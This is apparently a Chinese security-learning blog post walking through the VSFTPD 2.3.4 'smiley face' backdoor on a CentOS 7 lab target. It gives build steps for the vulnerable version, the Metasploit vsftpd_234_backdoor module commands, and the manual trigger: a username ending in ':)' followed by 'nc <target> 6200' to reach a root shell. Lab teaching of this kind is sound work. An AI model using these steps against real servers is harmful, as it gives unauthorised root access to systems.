#  VSFTPD 2.3.4 笑脸漏洞   
Sword  网络安全学习爱好者   2024-11-17 00:39  
  
# 环境搭建  
  
**压缩包需要下载特定版本，官方提供的安装包没有这个漏洞**  
  
1.靶机环境是centos7  ，首先解压缩包，并上传到靶机目录  
  
  tar -zxvf   压缩包名称  
  
2.进入vsftpd目录，赋予文件权限，之后进行make &&make install  
  
cd /vsftpd-2.3.4  
  
chmod 777 *  
  
make &&make install  
# 漏洞利用  
## code:1  
  
使用msf利用  
  
```
use exploit/unix/ftp/vsftpd_234_backdoor 
set RhoSTS 192.168.142.145
exploit
```  
  
```
```  
## code:2  
  
手动利用  
  
打开命令行登录ftp服务器，在用户名处输入root:)然后随意输入一个密码回车等待，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGBb636ckQ1MC08nniczShXsWRTiccOHCknXedybxxLPusj3PLXFDgPic1UBsd5odXAd3xRNL6KrqF1sQ/640?wx_fmt=png&from=appmsg "")  
  
输入nc 目标ip 6200 即可连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGBb636ckQ1MC08nniczShXsWiaE8iaOyAFCwKW2mZdSb9H4eNBXXTl40BhYb2iaS6Ywbib6nH9bf03NPaQ/640?wx_fmt=png&from=appmsg "")  
  
